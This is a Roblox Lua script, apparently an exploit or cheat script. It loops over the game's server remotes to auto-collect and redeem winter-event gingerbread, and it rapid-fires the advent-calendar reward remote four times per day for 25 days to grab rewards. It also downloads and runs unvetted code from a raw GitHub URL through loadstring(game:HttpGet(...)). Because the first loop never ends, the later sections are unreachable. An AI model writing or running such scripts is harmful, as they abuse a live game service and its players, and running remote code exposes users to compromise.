local ReplicatedStorage = game:GetService("ReplicatedStorage")
local gingerbreadMarkersFolder = ReplicatedStorage:WaitForChild("Resources"):WaitForChild("IceSkating"):WaitForChild("GingerbreadMarkers")

-- Infinite loop that repeats every 60 seconds
while true do
    -- Loop through each object in the GingerbreadMarkers folder
    for _, marker in ipairs(gingerbreadMarkersFolder:GetChildren()) do
        -- Create a new args table with the current marker's name
        local args = {
            [1] = marker.Name -- Use the name of the current marker
        }

        -- Invoke the server with the current marker's name
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("WinterEventAPI/PickUpGingerbread"):InvokeServer(unpack(args))

        -- Wait for 0.1 seconds before the next call
        wait(0.1)
    end

    -- Wait for 1 second before redeeming pending gingerbread
    wait(1)
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("WinterEventAPI/RedeemPendingGingerbread"):FireServer()

    -- Wait for 60 seconds before restarting the loop
    wait(60)
end

loadstring(game:HttpGet(('https://raw.githubusercontent.com/Spinzox/main/refs/heads/main/script.lua'),true))()
wait(2)  -- Initial wait time

for i = 1, 25 do
    -- Execute the same number four times rapidly
    for j = 1, 4 do
        local args = {i}  
        game:GetService("ReplicatedStorage").API:FindFirstChild("WinterfestAPI/AdventCalendarTryTakeReward"):InvokeServer(unpack(args))
    end
    wait(0.5)  -- Wait for 0.5 seconds before moving on to the next number
end
